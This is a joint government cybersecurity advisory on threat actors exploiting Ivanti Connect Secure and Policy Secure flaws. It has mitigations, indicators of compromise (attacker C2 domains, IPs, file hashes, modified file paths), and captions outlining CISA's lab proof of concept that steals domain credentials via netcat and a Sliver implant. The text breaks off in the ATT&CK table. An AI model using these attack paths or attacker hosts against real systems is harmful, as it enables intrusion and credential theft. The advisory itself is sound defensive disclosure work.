U.S. organizations: To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, 
contact your local FBI field office or CISA’s 24/7 Operations Center at report@cisa.gov or (888) 282-0870. When available, 
please include the following information regarding the incident: date, time, and location of the incident; type of activity; 
number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and 
a designated point of contact. SLTT organizations should report incidents to MS-ISAC (866-787-4722 or 
SOC@cisecurity.org). 
This document is marked TLP:CLEAR. Recipients may share this information without restriction. Information is subject to 
standard copyright rules. For more information on the Traffic Light Protocol, see cisa.gov/tlp/.   
Product ID: AA24-060B 
 
February 29, 2024 
 
 
 
Co-Authored by: 
 TLP:CLEAR 
 
 TLP:CLEAR 
 
 
Threat Actors Exploit Multiple Vulnerabilities in 
Ivanti Connect Secure and Policy Secure Gateways 
SUMMARY 
The Cybersecurity and Infrastructure Security Agency 
(CISA) and the following partners (hereafter referred to as 
the authoring organizations) are releasing this joint 
Cybersecurity Advisory to warn that cyber threat actors 
are exploiting previously identified vulnerabilities in Ivanti 
Connect Secure and Ivanti Policy Secure gateways. CISA 
and authoring organizations appreciate the cooperation of 
Volexity, Ivanti, Mandiant and other industry partners in 
the development of this advisory and ongoing incident 
response activities. Authoring organizations: 
• 
Federal Bureau of Investigation (FBI) 
• 
Multi-State Information Sharing & Analysis Center (MS-ISAC) 
• 
Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) 
• 
United Kingdom National Cyber Security Centre (NCSC-UK) 
• 
Canadian Centre for Cyber Security (Cyber Centre), a part of the Communications Security 
Establishment 
• 
New Zealand National Cyber Security Centre (NCSC-NZ) 
• 
CERT-New Zealand (CERT NZ) 
Of particular concern, the authoring organizations and industry partners have determined that cyber 
threat actors are able to deceive Ivanti’s internal and external Integrity Checker Tool (ICT), resulting in 
a failure to detect compromise. 
Actions to take today to mitigate cyber 
threats against Ivanti appliances: 
• 
Limit outbound internet connections 
from SSL VPN appliances to restrict 
access to required services. 
• 
Keep all operating systems and 
firmware up to date. 
• 
Limit SSL VPN connections to 
unprivileged accounts. 
 
 
 
Page 2 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
Cyber threat actors are actively exploiting multiple previously identified vulnerabilities—CVE-2023-
46805, CVE-2024-21887, and CVE-2024-21893—affecting Ivanti Connect Secure and Ivanti Policy 
Secure gateways. The vulnerabilities impact all supported versions (9.x and 22.x) and can be used in 
a chain of exploits to enable malicious cyber threat actors to bypass authentication, craft malicious 
requests, and execute arbitrary commands with elevated privileges.  
During multiple incident response engagements associated with this activity, CISA identified that 
Ivanti’s internal and previous external ICT failed to detect compromise. In addition, CISA has 
conducted independent research in a lab environment validating that the Ivanti ICT is not sufficient to 
detect compromise and that a cyber threat actor may be able to gain root-level persistence despite 
issuing factory resets. 
The authoring organizations encourage network defenders to (1) assume that user and service 
account credentials stored within the affected Ivanti VPN appliances are likely compromised, (2) hunt 
for malicious activity on their networks using the detection methods and indicators of compromise 
(IOCs) within this advisory, (3) run Ivanti’s most recent external ICT, and (4) apply available patching 
guidance provided by Ivanti as version updates become available. If a potential compromise is 
detected, organizations should collect and analyze logs and artifacts for malicious activity and apply 
the incident response recommendations within this advisory. 
Based upon the authoring organizations’ observations during incident response activities and 
available industry reporting, as supplemented by CISA’s research findings, the authoring 
organizations recommend that the safest course of action for network defenders is to assume a 
sophisticated threat actor may deploy rootkit level persistence on a device that has been reset and lay 
dormant for an arbitrary amount of time. For example, as outlined in PRC State-Sponsored Actors 
Compromise and Maintain Persistent Access to U.S. Critical Infrastructure, sophisticated actors may 
remain silent on compromised networks for long periods. The authoring organizations strongly urge 
all organizations to consider the significant risk of adversary access to, and persistence on, Ivanti 
Connect Secure and Ivanti Policy Secure gateways when determining whether to continue 
operating these devices in an enterprise environment.  
Note: On February 9, 2024, CISA issued Emergency Directive (ED) 24-01: Mitigate Ivanti Connect 
Secure and Ivanti Policy Secure Vulnerabilities, which requires emergency action from Federal 
Civilian Executive Branch (FCEB) agencies to perform specific actions on affected products. 
The Canadian Centre for Cyber Security also issued an alert, Ivanti Connect Secure and Ivanti Policy 
Secure gateways zero-day vulnerabilities, which provides periodic updates for IT professionals and 
managers affected by the Ivanti vulnerabilities. 
For a downloadable copy of IOCs, see: 
• 
AA24-060B (STIX XML, 71KB) 
• 
AA24-060B (STIX JSON, 54KB) 
 
 
 
 
 
Page 3 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
TECHNICAL DETAILS 
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE 
ATT&CK Tactics and Techniques in Appendix C for a table of the threat actors’ activity mapped to 
MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the 
MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK 
Mapping and CISA’s Decider Tool. 
Overview 
On January 10, 2024, Volexity reported on two vulnerabilities in Ivanti Connect Secure and Ivanti 
Policy Secure gateways observed being chained to achieve unauthenticated remote code execution 
(RCE):[1] 
• 
CVE 2023-46805 
• 
CVE-2024-21887 
Volexity first identified active exploitation in early December 2023, when they detected suspicious 
lateral movement [TA0008] on the network of one of their network security monitoring service 
customers. Volexity identified that threat actors exploited the vulnerabilities to implant web shells, 
including GLASSTOKEN and GIFTEDVISITOR, on internal and external-facing web servers 
[T1505.003]. Once successfully deployed, these web shells are used to execute commands on 
compromised devices.[1] 
After Ivanti provided initial mitigation guidance in early January, threat actors developed a way to 
bypass those mitigations to deploy BUSHWALK, LIGHTWIRE, and CHAINLINE web shell variants.[2] 
Following the actors’ developments, Ivanti disclosed three additional vulnerabilities: 
• 
CVE-2024-21893 is a server-side request forgery vulnerability in the SAML component of 
Ivanti Connect Secure (9.x, 22.x) Ivanti Policy Secure (9.x, 22.x), and Ivanti Neurons for ZTA 
that allows an attacker to access restricted resources without authentication. 
• 
CVE-2024-22024 is an XML vulnerability in the SAML component of Ivanti Connect Secure 
(9.x, 22.x), Ivanti Policy Secure (9.x, 22.x), and ZTA gateways that allows an attacker to 
access restricted resources without authentication. 
• 
CVE-2024-21888 is a privilege escalation vulnerability found in the web component of Ivanti 
Connect Secure and Ivanti Policy Secure. This vulnerability allows threat actors to gain 
elevated privileges to that of an administrator. 
Observed Threat Actor Activity 
CISA has responded to multiple incidents related to the above vulnerabilities in Ivanti Connect Secure 
and Policy Secure Gateways. In these incidents, actors exploited these CVEs for initial access to 
implant web shells and to harvest credentials stored on the devices. Post-compromise, the actors 
moved laterally into domain environments and have been observed leveraging tools that are native to 
the Ivanti appliances—such as freerdp, ssh, telnet, and nmap libraries—to expand their access to 
the domain environment. The result, in some cases, was a full domain compromise. 
 
 
 
Page 4 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
During incident response investigations, CISA identified that Ivanti’s internal and external ICT failed to 
detect compromise. The organizations leveraged the integrity checker to identify file mismatches in 
Ivanti devices; however, CISA incident response analysis confirmed that both the internal and 
external versions of the ICT were not reliable due to the existence of web shells found on systems 
that had no file mismatches according to the ICTs. Additionally, forensic analysis showed evidence 
the actors were able to clean up their efforts by overwriting files, time-stomping files, and re-mounting 
the runtime partition to return the appliance to a “clean state.” This reinforces that ICT scans are not 
reliable to indicate previous compromise and can result in a false sense of security that the device is 
free of compromise. 
As detailed in Appendix A, CISA conducted independent research in a lab environment validating that 
the ICT is likely insufficient for detecting compromise and that a cyber threat actor may be able to 
maintain root level persistence despite issuing factory resets and appliance upgrades. 
INDICATORS OF COMPROMISE 
See Tables 1 – 4 in Appendix B for IOCs related to cyber actors exploiting multiple CVEs related to 
Ivanti appliances. 
For additional indicators of compromise, see: 
• 
Volexity: Active Exploitation of Two Zero-Day Vulnerabilities in Ivanti Connect Secure VPN 
• 
Mandiant: Cutting Edge: Suspected APT Targets Ivanti Connect Secure VPN in New Zero-
Day Exploitation 
• 
Mandiant: Cutting Edge, Part 2: Investigating Ivanti Connect Secure VPN Zero-Day 
Exploitation 
• 
Mandiant: Cutting Edge, Part 3: Investigating Ivanti Connect Secure VPN Exploitation and 
Persistence Attempts 
Memory and disk forensics were used during forensic analysis, combined with the Integrity Checker 
Tool, to identify malicious files on the compromised Ivanti Connect Secure VPN appliance. This 
advisory provides a list of combined authoring organization IOCs and open source files identified by 
Volexity via network analysis. 
Disclaimer: Some IP addresses in this advisory may be associated with legitimate activity. 
Organizations are encouraged to investigate the activity around these IP addresses prior to taking 
action such as blocking. Activity should not be attributed as malicious without analytical evidence to 
support it is used at the direction of, or controlled by, threat actors. 
DETECTION METHODS 
YARA Rules 
See Appendix D for additional open source YARA rules, provided by Volexity, that may aid network 
defenders in detecting malicious activity within Ivanti Connect Secure VPN appliances. For more 
information on detection methods, visit Mandiant’s blog post Cutting Edge, Part 2: Investigating Ivanti 
Connect Secure VPN Zero-Day Exploitation or the Volexity GitHub page. 
 
 
 
Page 5 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
INCIDENT RESPONSE 
The authoring organizations encourage you to assess your organization’s user interface (UI) software 
and systems for evidence of compromise and to hunt for malicious activity using signatures outlined 
within this advisory. If compromise is suspected or detected, organizations should assume that threat 
actors hold full administrative access and can perform all tasks associated with the Ivanti Connect 
Secure VPN appliance as well as executing arbitrary code and installing malicious payloads. 
Note: These are vendor-managed appliances and systems may be encrypted with limited access. 
Thus, collecting artifacts may be limited on some versions of appliances. The authoring organizations 
recommend investigating associated devices on the network to identify lateral movement in the 
absence of access to the Secure Connect appliance.  
If a potential compromise is detected, organizations should: 
1. Quarantine or take offline potentially affected hosts. 
2. Reimage compromised hosts. 
3. Reset all credentials that may have been exposed during the compromise, including user and 
service accounts. 
4. Identify Ivanti hosts with Active Directory (AD) access, threat actors can trivially export active 
domain administrator credentials during initial compromise. Until there is evidence to the 
contrary, it is assumed that AD access on compromised systems is connected to external 
authentication systems such as Lightweight Directory Access Protocol (LDAP) and AD. 
5. Collect and review artifacts such as running processes/services, unusual authentications, and 
recent network connections. 
 
Note: Removing malicious administrator accounts may not fully mitigate risk considering 
threat actors may have established additional persistence mechanisms. 
6. Report the compromise to FBI Internet Crime Complaint Center (IC3) at IC3.gov, local FBI 
field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center 
(report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government entities can 
also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722). Organizations outside of the 
United States should contact their national cyber center. (See the Reporting section.) 
 
 
 
 
 
Page 6 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
MITIGATIONS 
The authoring organizations recommend organizations 
implement the mitigations below to improve your 
cybersecurity posture based on threat actor activity and 
to reduce the risk of compromise associated with Ivanti 
vulnerabilities. These mitigations align with the cross-
sector Cybersecurity Performance Goals (CPGs) 
developed by CISA and the National Institute of 
Standards and Technology (NIST). The CPGs provide a 
minimum set of practices and protections that CISA and 
NIST recommend all organizations implement. CISA and 
NIST based the CPGs on existing cybersecurity 
frameworks and guidance to protect against the most 
common and impactful threats, tactics, techniques, and 
procedures. Visit CISA’s Cross-Sector Cybersecurity 
Performance Goals for more information on the CPGs, 
including additional recommended baseline protections. 
• 
As organizations make risk decisions in 
choosing a VPN, to include decisions 
regarding continued operation of Ivanti Connect Secure and Policy Secure gateways, 
avoid VPN solutions that use proprietary protocols or non-standard features. VPNs as a class 
of devices carry some specific risks that a non-expert implementer may trigger (e.g., 
authentication integration and patching). When choosing a VPN, organizations should 
consider vendors who: 
o Provide a Software Bill of Materials (SBOM) to proactively identify, and enable remediation 
of, embedded software vulnerabilities, such as deprecated operating systems.  
o Allow a restore from trusted media to establish a root of trust. If the software validation 
tooling can be modified by the software itself, there is no way to establish a root of trust 
other than returning the device to the manufacturer (return material authorization [RMA]). 
o Are a CVE Numbering Authority (CNA) so that CVEs are assigned to emerging 
vulnerabilities in a timely manner. 
o Have a public Vulnerability Disclosure Policy (VDP) to enable security researchers to 
proactively share and disclose vulnerabilities through coordinated vulnerability disclosure 
(CVD).  
o Have in place a clear end-of-life policy (EoL) to prepare customers for updating to 
supported product versions. 
• 
Limit outbound internet connections from SSL VPN appliances to restrict access to 
required services. This will limit the ability of an actor to download tools or malware onto the 
device or establish outbound connections to command and control (C2) servers. 
• 
Ensure SSL VPN appliances configured with Active Directory or LDAP authentication use 
low privilege accounts for the LDAP bind. 
These mitigations apply to all critical 
infrastructure organizations and network 
defenders using Ivanti Connect Secure 
VPN and Ivanti Policy Secure. The 
authoring organizations recommend that 
software manufacturers incorporate Secure 
by Design principles and tactics into their 
software development practices. These 
principles and tactics can limit the impact of 
exploitation—such as threat actors 
leveraging newly discovered, unpatched 
vulnerabilities within Ivanti appliances—
thus, strengthening the secure posture for 
their customers. 
For more information on secure by design, 
see CISA’s Secure by Design webpage and 
joint guide. 
 
 
 
Page 7 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
• 
Limit SSL VPN connections to unprivileged accounts only to help limit the exposure of 
privileged account credentials. 
• 
Keep all operating systems, software, and firmware up to date. Timely patching is one of 
the most efficient and cost-effective steps an organization can take to minimize its exposure to 
cybersecurity threats. Organizations should patch vulnerable software and hardware systems 
within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited 
vulnerabilities in internet-facing systems [CPG 1.E]. 
• 
Secure remote access tools. 
o Implement application controls to manage and control execution of software, including 
allowlisting remote access programs. Application controls should prevent installation and 
execution of portable versions of unauthorized remote access and other software. A 
properly configured application allowlisting solution will block any unlisted application 
execution. Allowlisting is important because antivirus solutions may fail to detect the 
execution of malicious portable executables when the files use any combination of 
compression, encryption, or obfuscation. 
• 
Strictly limit the use of Remote Desktop Protocols (RDP) and other remote desktop 
services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]: 
o Audit the network for systems using RDP. 
o Close unused RDP ports. 
o Enforce account lockouts after a specified number of attempts. 
o Apply phishing-resistant multifactor authentication (MFA). 
o Log RDP login attempts. 
• 
Configure the Windows Registry to require User Account Control (UAC) approval for 
any PsExec operations requiring administrator privileges to reduce the risk of lateral 
movement by PsExec. 
• 
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary 
data and servers in a physically separate, segmented, and secure location (e.g., hard drive, 
storage device, or the cloud). 
• 
Require all accounts with password logins (e.g., service account, admin accounts, and 
domain admin accounts) to comply with NIST's standards for developing and managing 
password policies. 
o Use longer passwords consisting of at least 15 characters [CPG 2.B]. 
o Store passwords in hashed format using industry-recognized password managers. 
o Add password user “salts” to shared login credentials. 
o Avoid reusing passwords [CPG 2.C]. 
o Implement multiple failed login attempt account lockouts [CPG 2.G]. 
o Disable password “hints.” 
o Require administrator credentials to install software. 
• 
Review the CISA and NSA joint guidance for Selecting and Hardening Remote Access VPN 
Solutions. 
 
 
 
 
 
Page 8 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, the authoring organizations recommend exercising, testing, and 
validating your organization's security program against the threat behaviors mapped to the MITRE 
ATT&CK for Enterprise framework in this advisory. The authoring organizations recommend testing 
your existing security controls inventory to assess how the controls perform against the ATT&CK 
techniques described in this advisory. 
To get started: 
1. Select an ATT&CK technique described in this advisory (Appendix C). 
2. Align your security technologies against the technique. 
3. Test your technologies against the technique. 
4. Analyze your detection and prevention technologies’ performance. 
5. Repeat the process for all security technologies to obtain a set of comprehensive performance 
data. 
6. Tune your security program, including people, processes, and technologies, based on the 
data generated by this process. 
The authoring organizations recommend continually testing your security program, at scale, in a 
production environment to ensure optimal performance against the MITRE ATT&CK techniques 
identified in this advisory. 
REPORTING 
U.S. organizations should report every potential cyber incident to the U.S. government. When 
available, each report submitted should include the date, time, location, type of activity, number of 
people, and type of equipment used for the activity, the name of the submitting company or 
organization, and a designated point of contact. Reports can be submitted to the FBI’s Internet Crime 
Complaint Center (IC3), local FBI Field Office, or CISA via the agency’s Incident Reporting System or 
its 24/7 Operations Center at report@cisa.gov or (888) 282-0870. 
The FBI encourages organizations to report information concerning suspicious or criminal activity to 
their local FBI Field Office. 
Australian organizations that have been impacted or require assistance regarding Ivanti compromise, 
contact ASD’s ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au. 
UK organizations that have been impacted by Ivanti compromise, should report the incident to the 
National Cyber Security Centre. 
Organizations outside of the United States or Australia should contact their national cyber center. 
REFERENCES 
[1] Active Exploitation of Two Zero-Day Vulnerabilities in Ivanti Connect Secure VPN | Volexity 
[2] Ivanti Connect Secure VPN Exploitation Goes Global | Volexity 
[3] KB CVE-2023-46805 (Authentication Bypass) & CVE-2024-21887 (Command Injection) for 
Ivanti Connect Secure and Ivanti Policy Secure Gateways 
 
 
 
Page 9 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
[4] Cutting Edge, Part 2: Investigating Ivanti Connect Secure VPN Zero-Day Exploitation | 
Mandiant 
DISCLAIMER 
The information in this report is being provided “as is” for informational purposes only. CISA and 
authoring organizations do not endorse any commercial entity, product, company, or service, 
including any entities, products, or services linked within this document. Any reference to specific 
commercial entities, products, processes, or services by service mark, trademark, manufacturer, or 
otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and 
authoring organizations. 
ACKNOWLEDGEMENTS 
Volexity, Mandiant, and Ivanti contributed to this advisory. 
VERSION HISTORY 
February 29, 2024: Initial version. 
 
 
 
 
 
Page 10 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
APPENDIX A: CISA’S PRODUCT EVALUATION FINDINGS 
Research Approach 
As part of ongoing efforts to effectively serve the cybersecurity community with actionable insights 
and guidance, CISA conducted research by using a free and downloadable version of the Ivanti 
Connect Secure virtual appliance to assess potential attack paths and adversary persistence 
mechanisms. The virtual appliances were not connected to the internet, and were deployed in a 
closed virtualized network, with a non-internet connected Active Directory. This research included a 
variety of tests on version 22.3R1 Build 1647, connected to Active Directory credentials, to 
leverage the access obtained through CVE-2023-46805, CVE-2024-21887 and CVE-2024-21893. Put 
simply, CISA’s research team wanted to answer the question: “How far could an attacker go if they 
set were to exploit these CVEs remotely?” 
Persistent Post-Reset and -Upgrade Access 
Leveraging these vulnerabilities, CISA researchers were able to exfiltrate domain administrator 
cleartext credentials [TA0006], gain root-level persistence [TA0003], and bypass integrity checks 
used by the Integrity Checker application. CISA’s Incident Response team observed these specific 
techniques leveraged during the agency’s incident response engagements, along with the native tools 
and libraries to conduct internal reconnaissance and compromise domains behind the Ivanti 
appliances. CISA researchers assess that threat actors are able to use the credentials to move 
deeper into the environment. 
The ability to exfiltrate domain administrator cleartext credentials, if saved when adding an “Active 
Directory Authentication server” during setup, was accomplished by using the root-level access 
obtained from the vulnerabilities to interface directly with the internal server and retrieve the cached 
credentials as shown in Figure 4, APPENDIX A. Users who currently have active sessions to the 
appliance could have their base64 encoded active directory cleartext passwords, in addition to the 
New Technology LAN Manager (NTLM) password hashes, retrieved with the same access, as shown 
in Figure 10, APPENDIX A. In addition to users with active sessions, users previously authenticated 
can have base64 encoded active directory plaintext passwords and NTLM hashes harvested from the 
backups of the data.mdb database files stored on the appliance, as shown in Figure 15 and 16, 
APPENDIX A. 
The root-level access allows adversaries to maintain persistence despite issuing factory resets and 
appliance upgrades while deceiving the provided integrity checkers, creating the illusion of a clean 
installation. Due to the persistence mechanism being stored on the encrypted partition of the drive 
and inaccurate integrity check results, it is untenable for network administrators to validate their 
application has not been compromised without also decrypting the partition and validating against a 
clean installation of the appliance, which are actions not easily accomplished at present. Without 
major alterations of the integrity checking process, it is conceivable that new vulnerabilities that afford 
root-level access to the appliance could also result in root-kit level persistence to the appliance. 
 
 
 
Page 11 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
Below is proof of concept being released by CISA, which demonstrates the capacity of and 
opportunity for a threat actor to exfiltrate Domain Administrator credentials that were used during 
appliance configuration: 
 
Figure 1: Ivanti Domain Join Configuration with “Save Credentials” 
 
Figure 2: CVE-2023-46805 Exploitation for Reverse Netcat Connection 
 
 
 
 
Page 12 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
 
Figure 3: Upgrade Netcat Connection to Sliver Implant 
 
Figure 4: Leverage Sliver Implant to Run Perl Script for Retrieval of Cached Domain Administrator Credentials 
 
 
 
Page 13 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
Below is a demonstration of the capacity for post exploitation exfiltration of base64 encoded cleartext 
credentials for active directory users and their associated NTLM password hashes: 
 
Figure 5: Configuration of User Realm 
 
Figure 6: User Realm Configuration to Domain 
 
 
 
Page 14 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
 
Figure 7: Configuration of User Realm Mapping 
 
 
Figure 8: Login as “vpnuser1” to Establish an Active Session 
 
 
 
Page 15 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
 
Figure 9: Using Sliver Implant as Shown in Figure 3, Execute Perl Script to Retrieve base64 Encoded Cleartext 
Password and NTLM Password Hash for Authenticated User 
 
Figure 10: Decode base64 Encoded Blob to Display User’s Plaintext Credentials 
 
Figure 11: Using Mimikatz Validate NTLM Password Hash Obtained in Figure 10 Matches Active Directory User 
Credential Hash 
 
 
 
Page 16 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
 
Figure 12: Inactive Sessions for “vpnuser2” and “vpnuser3” Appear in Server Logs 
 
Figure 13: Exfiltrate “lmdb/data” and “lmdb-backup/data” data.mb Database Files Containing Credentials for Active 
and Inactive Sessions 
 
 
 
Page 17 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
 
Figure 14: Parse Database Files to Disclose base64 Encoded Plaintext Credentials from LMDB Database Files 
 
Figure 15: Parse Database Files to Disclose NTLM Hashes from LMDB Database Files 
 
 
 
Page 18 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
 
Figure 16: Parse Backup Database Files to Disclose Additional base64 Encoded Plaintext Credentials from LMDB-
Backup Database Files 
 
Figure 17: Decode Credentials from LMDB-Backup Database Files 
 
Figure 18: Parse Database Files to Disclose NTLM Hashes for Additional Users from LMDB-Backup Database Files 
 
 
 
 
 
Page 19 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
APPENDIX B: INDICATORS OF COMPROMISE 
Table 1: Ivanti Connect Secure VPN Indicators of Compromise 
Filename 
Description 
Purpose 
/home/perl/DSLogConfig.pm 
Modified Perl module. 
Designed to execute 
sessionserver.pl. 
/usr/bin/a.sh 
gcore.in core dump 
script. 
 
/bin/netmon 
Sliver binary. 
 
/home/venv3/lib/python3.6/site-
packages/*.egg 
Python package 
containing WIREFIRE 
among other files. 
 
/home/etc/sql/dsserver/sessionserver.pl 
Perl script to remount 
the filesystem with 
read/write access. 
Make sessionserver.sh 
executable, execute it, then 
restore original mount settings. 
/home/etc/sql/dsserver/sessionserver.sh Script executed by 
sessionserver.pl. 
Uses regular expressions to 
modify compcheckresult.cgi 
to insert a web shell into it; 
also creates a series of entries 
into files associated with the 
In-build Integrity Checker Tool 
to evade detection when 
periodic scans are run. 
/home/webserver/htdocs/dana-
na/auth/compcheckresult.cgi 
Modified legitimate 
component of the ICS 
VPN appliance, with 
new Perl module 
imports added and a 
one-liner to execute 
commands based on 
request parameters. 
Allows remote code execution 
over the Internet if the attacker 
can craft a request with the 
correct parameters. 
/home/webserver/htdocs/dana-
na/auth/lastauthserverused.js 
Modified legitimate 
JavaScript component 
loaded by user login 
page of the Web SSL 
VPN component of 
Ivanti Connect Secure. 
Modified to harvest entered 
credentials and send them to a 
remote URL on an attacker-
controlled domain. 
 
 
 
Page 20 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
Table 2: Ivanti Connect Secure VPN Indicators of Compromise 
Value 
Type 
Description  
88.119.169[.]227 
IP Address 
 
103.13.28[.]40 
IP Address 
 
46.8.68[.]100 
IPv4 
 
206.189.208[.]156 
IP Address 
DigitalOcean IP address tied to 
UTA0178. 
gpoaccess[.]com 
Hostname 
Suspected UTA0178 domain 
discovered via domain 
registration patterns. 
webb-institute[.]com 
Hostname 
Suspected UTA0178 domain 
discovered via domain 
registration patterns. 
symantke[.]com 
Hostname 
UTA0178 domain used to 
collect credentials from 
compromised devices. 
75.145.243[.]85 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device. 
47.207.9[.]89 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
98.160.48[.]170 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
173.220.106[.]166 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
73.128.178[.]221 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
 
 
 
Page 21 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
Value 
Type 
Description  
50.243.177[.]161 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
50.213.208[.]89 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
64.24.179[.]210 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
75.145.224[.]109 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
50.215.39[.]49 
IP Address 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
71.127.149[.]194 
 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
173.53.43[.]7 
 
UTA0178 IP address observed 
interacting with compromised 
device tied to Cyberoam proxy 
network. 
Table 3: Host-Based Indicators (HBIs) Indicators of Compromise 
Filename 
Hash Value 
Description 
Cav-0.1-py3.6.egg 
ed4b855941d6d7e07aacf016a2402c4c870876a050a4a547af
194f5a9b47945f 
WIREFIRE 
web shell 
Health.py 
3045f5b3d355a9ab26ab6f44cc831a83 
CHAINLINE 
web shell 
 
 
 
Page 22 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
Filename 
Hash Value 
Description 
compcheckresult.c
gi 
3d97f55a03ceb4f71671aa2ecf5b24e9 
CHAINLINE 
web shell 
lastauthserverused.
js 
2ec505088b942c234f39a37188e80d7a 
LIGHTWIRE 
web shell 
lastauthserverused.
js 
8eb042da6ba683ef1bae460af103cc44 
WARPWIRE 
credential 
harvester 
variant 
lastauthserverused.
js 
a739bd4c2b9f3679f43579711448786f 
WARPWIRE 
credential 
harvester 
variant 
lastauthserverused.
js 
a81813f70151a022ea1065b7f4d6b5ab 
WARPWIRE 
credential 
harvester 
variant 
lastauthserverused.
js 
d0c7a334a4d9dcd3c6335ae13bee59ea 
WARPWIRE 
credential 
harvester 
variant 
lastauthserverused.
js 
e8489983d73ed30a4240a14b1f161254 
WARPWIRE 
credential 
harvester 
variant 
logo.gif 
N/A — varies 
Configuration 
and cache 
dump or CAV 
web server 
log 
exfiltration 
login.gif 
N/A — varies 
Configuration 
and cache 
dump 
[a-fA-f0-9]{10\.css 
N/A — varies 
Configuration 
and cache 
dump 
 
 
 
Page 23 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
Filename 
Hash Value 
Description 
visits.py 
N/A — varies 
WIREFIRE 
web shell 
Table 4: Host-Based Indicators (HBIs) Indicators of Compromise 
Network Indicator 
Type 
Description 
symantke[.]com 
Domain 
WARPWIRE C2 server 
miltonhouse[.]nl 
Domain 
WARPWIRE variant C2 server 
entraide-internationale[.]fr 
Domain 
WARPWIRE variant C2 server 
api.d-n-s[.]name 
Domain 
WARPWIRE variant C2 server 
cpanel.netbar[.]org 
Domain 
WARPWIRE variant C2 server 
clickcom[.]click 
Domain 
WARPWIRE variant C2 server 
clicko[.]click 
Domain 
WARPWIRE variant C2 server 
duorhytm[.]fun 
Domain 
WARPWIRE variant C2 server 
line-api[.]com 
Domain 
WARPWIRE variant C2 server 
areekaweb[.]com 
Domain 
WARPWIRE variant C2 server 
ehangmun[.]com 
Domain 
WARPWIRE variant C2 server 
secure-cama[.]com 
Domain 
WARPWIRE variant C2 server 
146.0.228[.]66 
IPv4 
WARPWIRE variant C2 server 
159.65.130[.]146 
IPv4 
WARPWIRE variant C2 server 
8.137.112[.]245 
IPv4 
WARPWIRE variant C2 server 
91.92.254[.]14 
IPv4 
WARPWIRE variant C2 server 
186.179.39[.]235 
IPv4 
Mass exploitation activity 
50.215.39[.]49 
IPv4 
Post-exploitation activity 
45.61.136[.]14 
IPv4 
Post-exploitation activity 
173.220.106[.]166 
IPv4 
Post-exploitation activity 
 
 
 
 
 
Page 24 of 29  |  Product ID: AA24-060B 
TLP:CLEAR 
 
 
 TLP:CLEAR 
 
APPENDIX C: MITRE ATT&CK TACTICS AND TECHNIQUES 
Table 5: Cyber Actors ATT&CK Techniques for Enterprise 
Initial Access 
Technique Title 
ID 
Use 
Exploit Public-Facing 
Applications 
T1190 
Cyber actors will use custom web shells planted 
on public facing applications which allows 
persistence in victims’ environment. 
Persistence 
Technique Title 
ID 
Use 
Valid Accounts 
T1078 
Cyber actors leverage compromised accounts to 
laterally move within internal systems via RDP, 
SBD, and SSH. 
Server Software 
Component: Web 
Shell 
T1505.003 
